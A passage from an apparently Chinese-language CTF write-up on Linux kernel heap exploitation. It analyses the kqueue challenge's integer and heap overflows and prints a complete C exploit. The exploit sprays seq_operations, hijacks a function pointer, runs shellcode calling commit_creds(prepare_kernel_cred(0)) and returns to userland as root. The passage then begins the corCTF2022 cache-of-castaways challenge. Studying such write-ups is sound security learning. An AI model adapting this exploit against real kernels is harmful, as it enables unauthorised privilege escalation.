class="hljs-type">char</span> *data;                   <br>    queue_entry *next;            <br>&#125;;                                <br></code></pre></td></tr></table></figure><p>其中通过名称大致可以判别他们的功能</p><p>在源码当中显示他们的结构如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/83025aafa40f4bfb70218a67454f78f0f736180b.jpg"></p><p>且在模块中可以看到存在一个全局变量 <code>kqueues[]</code>数组,他是一个 <code>queue *</code>类型的数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">                                           <br><span class="hljs-comment">/* 此乃哥们的传入参数 */</span>  <br>                                           <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span>                            <br>    <span class="hljs-type">uint32_t</span> max_entries;                  <br>    <span class="hljs-type">uint16_t</span> data_size;                    <br>    <span class="hljs-type">uint16_t</span> entry_idx;                    <br>    <span class="hljs-type">uint16_t</span> queue_idx;                    <br>    <span class="hljs-type">char</span>* data;                            <br>&#125;<span class="hljs-type">request_t</span>;                                <br><br></code></pre></td></tr></table></figure><p>大致数据结构分析完毕，接下来着手分析其中漏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now you have the option to safely preserve your precious kqueues */</span>                               <br><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;                                         <br>                                                                                                     <br>...                                                        <br>                       <br>                                                                                                     <br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span>                                                           <br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;                                                                                    <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;                                                            <br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)                                                     <br>            <span class="hljs-keyword">break</span>;                                                                                   <br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)                                                  <br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));   <span class="hljs-comment">//vulnuribility      </span><br>        <span class="hljs-keyword">else</span>                                                                                         <br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);                                                               <br>        kqueue_entry = kqueue_entry-&gt;next;                                                           <br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;                                                               <br>    &#125;                                                                                                <br>                                                                                                     <br>    <span class="hljs-comment">/* Mark the queue as saved */</span>                                                                    <br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;                                                               <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                                                                        <br>&#125;                                                                                                    <br><br></code></pre></td></tr></table></figure><p>漏洞点出现在 <code>save_kqueue_entries</code>函数当中，在复制内容到new_queue的过程当中,这里并没有使用到它自身 <code>queue-&gt;data_size</code> ，我们可以任意输入 <code>request.data_size</code>来造成 <code>kernel heap overflow</code>，初步我们可以考虑堆喷一定的结构体来进行指针覆盖，</p><p>这里可以尝试使用msg_msg + seq_operations 来泄露内核地址,下面是初步的漏洞利用猜想，刚好借用了 <code>CVE-2022-0185</code>当中的思想：</p><ol><li>首先堆喷一定的msg_msg,这里务必分配内容要为 <code>0x1000 + sizeof(struct seq_operations) - sizeof(struct msg) - sizeof(struct msgseg)</code>,堆喷该特定的大小是为了下一步堆喷seq_operations做准备</li><li>分配特定大小的 <code>kqueue</code>,务必使得他能跟msg_msg分配的来源一致，例如都从 <code>kmalloc-1k</code>当中分配，这样就有几率使得我们的kqueue紧贴着堆喷到的某一个msg_msg结构体上</li><li>假设我们成功使他们相邻，我们就可以利用堆溢出来修改 <code>msg_msg-&gt;m_ts</code>，将其改大，然后我们尝试使用msg_rcv来读一下其中数据，如果说大于我们之前分配的值，那就说明该msg_msg就是 <code>victim msg_msg</code></li><li>找到 <code>victim msg_msg</code>后，我们就可以利用其中的越界读了，此时我们可以再次大量堆喷 <code>struct seq_operations</code>，然后越界读其中的函数指针地址完成泄露</li><li>由于题目内核版本为5.8.1，因此仍可以采用userfaultfd,所以这里可以在send msg的过程中，当函数加载到 <code>load_msg</code>，可以利用条件竞争修改其中的next指针，使其完成任意写，这里可以写 <code>modprobe_path</code></li></ol><p>但是看了其他师傅的wp我发现我就是个:black_joker: :(</p><p>这里题目实际上还给了一个漏洞的利用，那就是整形的溢出，在我们创建queue结构体的时候，并没有对传入的<code>request.max_entries</code>进行检测,此时如果我们创建queue传入<code>max_entries参数</code>为<code>0xffffffff</code>,这里的 <code>space</code>字段就变成了0</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">__builtin_umulll_overflow</span>(<span class="hljs-name">sizeof</span>(<span class="hljs-name">queue_entry</span>),(<span class="hljs-name">request</span>.max_entries+1),<span class="hljs-symbol">&amp;space</span>) == true)<br>    err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>)<span class="hljs-comment">;                                                         </span><br></code></pre></td></tr></table></figure><p>所以最终分配给queue的空间就只有 <code>sizeof(struct queue)</code>，为0x20大小，因此可以想到使用 <code>seq_operations</code>结构体来进行利用</p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>整体流程十分简洁</p><ol><li>首先是利用第一个点，我们在创建queue的时候传入 <code>0xffffffff</code>，这样最终可以创建一个只有queue的队列而不包含其中的 <code>queue_entry</code></li><li>然后我们分配的data大小分配的是用来存放我们的shellcode指针的</li><li>我们此时利用第二个点那就是 <code>save_kqueue_entries</code>函数的堆溢出， 而由于我们的queue_size只有一个 <code>struct queue</code>结构体，而他的大小为0x20，因此我们大量堆喷 <code>seq_operations</code>结构体来构造相邻情况</li><li>此时当我们堆喷了大量的 <code>seq_operations</code>结构体后，假设刚好堆喷到了 <code>new_queue</code>的下一个结构体（实际上这有着极大概率出现该情况），此时我们就可以利用其中的堆溢出来将 <code>seq_operations-&gt;start</code>函数覆盖为我们的shellcode，然后下次读该 <code>seq_operations</code>所对应的fd指针时将会调用他</li><li>而由于有KASLR，我们还需要泄露出内核基地址，此时我们可以利用userland的pwn手法，也就是在栈上面寻找合适的地址，事实上我们也确实找到了一个稳定的内核地址，因此我们自己撰写shellcode然后调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>即可</li></ol><p>而题目中有个大坑，那就是在我开启的虚拟环境当中，正常最后调用 <code>system(&quot;/bin/sh&quot;)</code>会出现报错，起初是因为堆栈不平衡我倒是理解，但是之后我调整堆栈还是不行，在尝试的过程当中我发现他的终端是 <code>-sh</code>,这里不太明白，</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d228a420da7002309f79052d2c8.jpg"></p><p>图中可以看到我们确实重启了一个新的终端，并且既然运行到这里也说明它通过了我uid的检查，确实属于root用户，但是仍然不能查看其中的flag，感觉可能是他的文件系统init脚本中配置的问题（下面），可惜看到后面没看出甚么名堂，还是太菜了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># use the /dev/console device node from devtmpfs if possible to not      </span><br><span class="hljs-comment"># confuse glibc&#x27;s ttyname_r().                                           </span><br><span class="hljs-comment"># This may fail (E.G. booted with console=), and errors from exec will   </span><br><span class="hljs-comment"># terminate the shell, so use a subshell for the test                    </span><br><span class="hljs-keyword">if</span> (exec <span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/dev/</span>console) <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null; then                               <br>    exec <span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/dev/</span>console                                                  <br>    exec <span class="hljs-number">1</span>&gt;<span class="hljs-regexp">/dev/</span>console                                                  <br>    exec <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>console                                                  <br>fi                                                                       <br></code></pre></td></tr></table></figure><p>最后直接取了个巧没有进行权限提升，直接打印的flag，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/10dfa9ec8a136327dacdda00d78fa0ec08fac7e5.jpg"></p><p>题目exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> data_size;                                            <br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span> <br>    <span class="hljs-type">uint32_t</span> max_entries;                                          <br>    <span class="hljs-type">uint16_t</span> idx;                                                  <br>    <span class="hljs-type">char</span>* data;                                                    <br><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVE          0xB105BABE</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> root_shell;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        error_log(<span class="hljs-string">&quot;Failed to get root shell...&quot;</span>);<br>    &#125;<br>    info_log(<span class="hljs-string">&quot;I will get root shell...&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;You got my shell :)&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> maxentries, <span class="hljs-type">uint16_t</span> datasize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .max_entries = maxentries,<br>        .data_size = datasize,<br>    &#125;;<br>    ioctl(dev_fd, CREATE_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx, <span class="hljs-type">uint16_t</span> entry_idx, <span class="hljs-type">char</span> *data)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data = data,<br>    &#125;;<br>    ioctl(dev_fd, EDIT_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, DELETE_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> idx, <span class="hljs-type">uint32_t</span> maxentries, <span class="hljs-type">uint16_t</span> datasize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = idx,<br>        .max_entries = maxentries,<br>        .data_size = datasize,<br>    &#125;;<br>    ioctl(dev_fd, SAVE, &amp;request);<br>&#125;<br><br><span class="hljs-type">size_t</span> middle_rsp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">()</span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r14, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r14, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r14;&quot;</span><br>        <span class="hljs-string">&quot;add r13, 0x8c580;&quot;</span><br>        <span class="hljs-string">&quot;mov r12, r14;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, 0;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, middle_rsp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_shell;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>        );<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    saveStatus();<br><br>    middle_rsp = user_sp + <span class="hljs-number">0x8</span>;<br>    root_shell = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-type">int</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    info_log(<span class="hljs-string">&quot;Step I:Create a queue without any queue_entry :)&quot;</span>);<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    create_kqueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);      <span class="hljs-comment">//the queue-&gt;data include many shellcode ad</span><br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)&#123;<br>        data[i] = (<span class="hljs-type">size_t</span>)shellcode;<br>    &#125;<br>    edit_kqueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (<span class="hljs-type">char</span> *)data);<br>    info_log(<span class="hljs-string">&quot;Step II:Spraying the seq_operations!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)&#123;<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the get shell addr is :0x%lx\n&quot;</span>, (<span class="hljs-type">size_t</span>)get_root_shell);<br>    info_log(<span class="hljs-string">&quot;Step III:Overwrite 0x20 bytes...&quot;</span>);<br>    save_kqueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)&#123;<br>        read(seq_fd[i], data, <span class="hljs-number">0x8</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="八、Kernel-Heap-Cross-Cache-Overflow"><a href="#八、Kernel-Heap-Cross-Cache-Overflow" class="headerlink" title="八、Kernel Heap - Cross Cache Overflow"></a>八、Kernel Heap - Cross Cache Overflow</h1><h2 id="例题：corCTF2022-cache-of-castways"><a href="#例题：corCTF2022-cache-of-castways" class="headerlink" title="例题：corCTF2022-cache of castways"></a>例题：corCTF2022-cache of castways</h2><p>题目首先给出README，我们来康康，BitsByWill师傅给出了这样一段提示：</p><blockquote><p>After repeated attacks on poor kernel objects, I’ve decided to place pwners in a special isolated place - a marooned region of memory. Good luck escaping out of here :^) </p></blockquote><p>意思很明显，内核大师已经不满足于通用object的漏洞利用，直接告诉我们需要在一个隔离的环境完成利用，害怕 :^(</p><h3 id="1-题目逆向-5"><a href="#1-题目逆向-5" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><p><a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">官方wp</a>中已经给出了完整的源码，我们就不需要模拟当时比赛的情景，直接聚焦于漏洞的利用当中，这里感谢BitsByWill师傅在题目当中同时提供了内核config和带有调试符号的内核映像，这为之后的学习省去了很多不必要的麻烦</p><p>首先查看启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>exec qemu-system-x86_64 \<br>    -m 4096M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot; \<br>    -netdev user,id=net \<br>    -device e1000,netdev=net \<br>    -no-reboot \<br>    -monitor /dev/null \<br>    -cpu qemu64,+smep,+smap \<br>    -initrd initramfs.cpio.gz \                                          <br><br></code></pre></td></tr></table></figure><p>4G的内存，同时开启了smep、smap、kpti</p><p>实际上没必要查看，因为肯定保护全开orz</p><p>然后就是文件系统的初始化脚本，发现其中插入了我们需要分析的漏洞模块 <code>cache_of_castway.ko</code></p><p>启动！我朝好帅</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/ac345982b2b7d0a2bbfd42ae8def76094b369ac9.jpg"></p><h4 id="init-castaway-driver"><a href="#init-castaway-driver" class="headerlink" title="init_castaway_driver"></a>init_castaway_driver</h4><p>首先来看init函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW_SZ 0x6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNK_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 8 * 50</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_cache</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> buf[CHUNK_SIZE];<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">init_castaway_driver</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    castaway_dev.minor = MISC_DYNAMIC_MINOR;<br>    castaway_dev.name = DEVICE_NAME;<br>    castaway_dev.fops = &amp;castaway_fops;<br>    castaway_dev.mode = <span class="hljs-number">0644</span>;<br>    mutex_init(&amp;castaway_lock);<br>    <span class="hljs-keyword">if</span> (misc_register(&amp;castaway_dev))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    castaway_arr = kzalloc(MAX * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">castaway_t</span> *), GFP_KERNEL); <span class="hljs-comment">//400个 castaway_t大小的数组</span><br>    <span class="hljs-keyword">if</span> (!castaway_arr)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    castaway_cachep = KMEM_CACHE(castaway_cache, SLAB_PANIC | SLAB_ACCOUNT); <span class="hljs-comment">//出题者自行构造的隔离kmem_cache</span><br>    <span class="hljs-keyword">if</span> (!castaway_cachep)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    printk(KERN_INFO <span class="hljs-string">&quot;All alone in an castaway cache... \n&quot;</span>);<br>    printk(KERN_INFO <span class="hljs-string">&quot;There&#x27;s no way a pwner can escape!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 